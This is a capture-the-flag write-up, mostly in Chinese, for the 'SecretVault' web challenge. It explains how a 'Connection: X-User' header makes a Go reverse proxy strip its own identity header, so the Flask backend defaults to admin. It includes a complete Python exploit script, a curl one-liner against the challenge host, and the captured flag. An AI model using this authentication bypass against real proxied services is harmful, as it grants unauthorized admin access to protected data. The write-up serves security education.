# SecretVault — Writeup

## 1. 题目信息

| 项目 | 内容 |
| --- | --- |
| 题目 | SecretVault |
| 分类 | Web |
| 目标 | `http://49.232.142.230:19625/`（平台端口，容器内为 `authorizer:5555`） |
| 附件 | `SecretVault.zip`（含 Go `authorizer/` + Flask `vault/` 完整源码） |
| 附件 SHA256 | `SecretVault.zip` = `04b39e265e3a15db4b076c16af883535104408fa97462d21d3c70eac278e186d`<br>`vault/app.py` = `058a3f2b1837a8e11eee836e594eaae0291af341e43b71065f3435ce35c5ce4c`<br>`authorizer/main.go` = `2c6a4db17b16709b8dd3ae8075b0813c072aa64ae9e69d22aa0f37d1696cf227` |
| 技术栈 | Go 1.25.2（`net/http/httputil.ReverseProxy` + gorilla/mux + golang-jwt/v5）、Python 3.13 / Flask / Flask-SQLAlchemy / cryptography(Fernet)，Werkzeug 3.1.3 |
| Flag | `flag{553118147dc4bf73deb6d2c298120e98}` |

## 2. Recon

```bash
$ file SecretVault.zip          # zip，含 authorizer/（Go）与 vault/（Flask）
$ cat Dockerfile docker-compose.yml entrypoint.sh
```

`docker-compose.yml` 只发布一个端口：

```yaml
ports:
  - "5555:5555"      # 即 Go authorizer，不是 Flask
```

`entrypoint.sh` 把 `${FLAG}` 写进 `/flag`，启动两个进程：
`authorizer`（`go build` 出的二进制，监听 `:5555`）和 `vault/app.py`（Flask，监听 `127.0.0.1:5000`）。
authorizer 同进程内还在 `127.0.0.1:4444` 起了 `/sign` 签发 JWT（仅本机可达）。

在线探测：

```bash
$ curl -i http://49.232.142.230:19625/
HTTP/1.1 302 Found
Server: Werkzeug/3.1.3 Python/3.13.9
Location: /login
```

`Server: Werkzeug` 说明请求经 Go 代理透传到了 Flask；直接访问 `/dashboard` 无凭据时返回 302 → `/login`。

## 3. 漏洞分析

### (1) Go 侧：Director 之后才剥 hop-by-hop 头

`authorizer/main.go`：

```go
authorizer := &httputil.ReverseProxy{Director: func(req *http.Request) {
    req.URL.Scheme = "http"
    req.URL.Host = "127.0.0.1:5000"
    uid := GetUIDFromRequest(req)                    // 从 JWT 取 uid；失败为 ""
    req.Header.Del("Authorization")
    req.Header.Del("X-User")                          // 关键：清掉客户端伪造的 X-User
    req.Header.Del("Cookie")
    if uid == "" {
        req.Header.Set("X-User", "anonymous")
    } else {
        req.Header.Set("X-User", uid)
    }
}}
```

看起来 `X-User` 一定由代理按 JWT 设定，客户端无法伪造。但 Go 的 `httputil.ReverseProxy` 在
**Director 执行之后**还会调用 `removeHopByHopHeaders`，把客户端 `Connection` 头里**列出的**每一个
头名当作 hop-by-hop 头删掉（Go 1.25.2 `net/http/httputil/reverseproxy.go`）：

```go
// removeHopByHopHeaders removes hop-by-hop headers.
connection := outreq.Header.Get("Connection")
for _, f := range strings.Split(connection, ",") {
    if f = strings.TrimSpace(textproto.CanonicalMIMEHeaderKey(f)); f != "" {
        outreq.Header.Del(f)          // X-User 在这里被删掉
    }
}
```

于是客户端发送：

```
Connection: X-User
```

代理先由 Director `Set("X-User", ...)`，随后 `removeHopByHopHeaders` 又把它删除。到 Flask 时
**`X-User` 头根本不存在**。

### (2) Flask 侧：`X-User` 缺失时默认 admin

`vault/app.py` 的鉴权装饰器：

```python
def login_required(view_func):
    def wrapped(*args, **kwargs):
        uid = request.headers.get('X-User', '0')     # ← 默认 '0'
        if uid == 'anonymous':
            return redirect(url_for('login'))
        try:
            uid_int = int(uid)
        except (TypeError, ValueError):
            return redirect(url_for('login'))
        user = User.query.filter_by(id=uid_int).first()
        ...
```

`X-User` 缺失 → `uid = '0'` → `User(id=0)` 正是初始化时创建的 admin。`/dashboard` 会遍历
`admin.vault_entries` 并用 Fernet 解密，其中 `label='flag'` 那条就是 flag。

两个缺陷叠加：代理"以为" X-User 总是可信并已设置，而后端把"缺失"当成了合法默认值。

## 4. Why it works（可直接复用的常量/事实）

- 目标端口 `19625` 映射到容器内 Go authorizer 的 `5555`；Flask `5000` 不对外。
- authorizer `Director` 设置 `X-User`（`main.go:99-103`）。
- Go `ReverseProxy.removeHopByHopHeaders` 运行在 Director **之后**，删除 `Connection` 头中列出的头（Go 1.25.2）。
- Flask `login_required`：`request.headers.get('X-User', '0')`（`app.py:101`），默认 `'0'`。
- admin 用户 `id=0`，其唯一 `VaultEntry.label='flag'`（`app.py:74-96`）。
- 结论：`GET /dashboard` 且 `Connection: X-User` → 代理剥掉 `X-User` → 后端以 admin 身份返回 dashboard。

注意：`X-User` 本身**不能**直接伪造——代理会 `Del`/`Set` 覆盖它；绕过点在于让代理把**它自己设置的**
那个头也删掉。

## 5. Attack Chain

```
client ──GET /dashboard, Connection: X-User──▶ Go authorizer :5555
                                                  │ Director: (JWT 无效) Set X-User=anonymous
                                                  │ removeHopByHopHeaders: Del("X-User")   ← 被连接头点名
                                                  ▼
                                        Flask :5000  X-User 头缺失
                                                  │ login_required: uid = '0' (默认) → admin
                                                  ▼
                                        200 OK, dashboard 内 Fernet 解密 flag entry
                                                  ▼
                                    flag{553118147dc4bf73deb6d2c298120e98}
```

## 6. Full script

`exploits/SecretVault.py`：

```python
#!/usr/bin/env python3
"""SecretVault — Go ReverseProxy hop-by-hop header stripping -> admin."""
from __future__ import annotations

import http.client
import re
import sys
from urllib.parse import urlsplit

FLAG_RE = re.compile(r"flag\{[^}]+\}")


def exploit(base: str) -> str | None:
    parts = urlsplit(base)
    host, port = parts.hostname, parts.port or 80
    conn = http.client.HTTPConnection(host, port, timeout=20)
    conn.putrequest("GET", "/dashboard", skip_accept_encoding=True)
    conn.putheader("Connection", "X-User")       # 让代理删掉它自己设的 X-User
    conn.endheaders()
    resp = conn.getresponse()
    body = resp.read().decode("utf-8", "replace")
    conn.close()
    print(f"[*] HTTP {resp.status} {resp.reason}  ({len(body)} bytes)")
    m = FLAG_RE.search(body)
    return m.group(0) if m else None


if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://49.232.142.230:19625"
    flag = exploit(target)
    print("[+] flag:", flag if flag else "NOT FOUND")
    sys.exit(0 if flag else 1)
```

运行：

```bash
python3 exploits/SecretVault.py http://49.232.142.230:19625
```

等价一行命令：

```bash
curl -si -H 'Connection: X-User' http://49.232.142.230:19625/dashboard
```

## 7. Observed output

```
[*] HTTP 200 OK  (4677 bytes)
[+] flag: flag{553118147dc4bf73deb6d2c298120e98}
```

原始响应（节选）：

```
HTTP/1.1 200 OK
Content-Length: 4677
Content-Type: text/html; charset=utf-8
Server: Werkzeug/3.1.3 Python/3.13.9

<!doctype html>
<html lang="en">
<head><title>Password Vault - Vault</title></head>
...
```

## 8. Gotchas / dead ends

- **`X-User: 0` 直接注入无效**：代理的 Director 会 `Del("X-User")` 再 `Set`，客户端值被覆盖。
- **`X_user`（下划线）无效**：HTTP 头名用连字符，Werkzeug 不会把它当成 `X-User`。
- **JWT 无法伪造**：`SecretKey = hex(RandomBytes(32))` 每次启动随机；`alg=none` 被 keyfunc 的
  `*jwt.SigningMethodHMAC` 类型检查拒绝。
- **`/sign`（`127.0.0.1:4444`）不可达**：仅绑本机且校验 `RemoteAddr` 前缀；外网扫 4444/5000 会被
  防火墙丢包（TCP 可连但 HTTP 超时），没有 SSRF 打到它。
- 关键点不是"删一个头"，而是 Go 把**客户端 `Connection` 头里列的名字**全部当 hop-by-hop 删除，
  且删除发生在 Director 之后 —— 这才会连代理自己刚设的头一起删。

## 9. Verification

- 独立复现：`curl -si -H 'Connection: X-User' .../dashboard` 返回 `200` 且页面含 flag；
  另用原始 socket 发送同请求（`Connection: X-User`）得到一致的 200 + flag，排除客户端库自动改写头。
- 对照：不带该头访问 `/dashboard` 返回 `302 → /login`。
- flag 形状 `flag{32位hex}` 与 `docker-compose.yml` 里 `ICQ_FLAG: flag{test}` 的格式一致。
- muteki 多模型 swarm（`deepseek-v4-pro` / `kimi-k3` / `glm-5.3`）在同一黑板协同，由
  `glm-5.3` 命中并提交，provenance 门禁对原始 curl/socket 输出校验通过；
  取证文件见 `sessions/run-0487/workspace/shared/poc-connection-header-bypass/`。
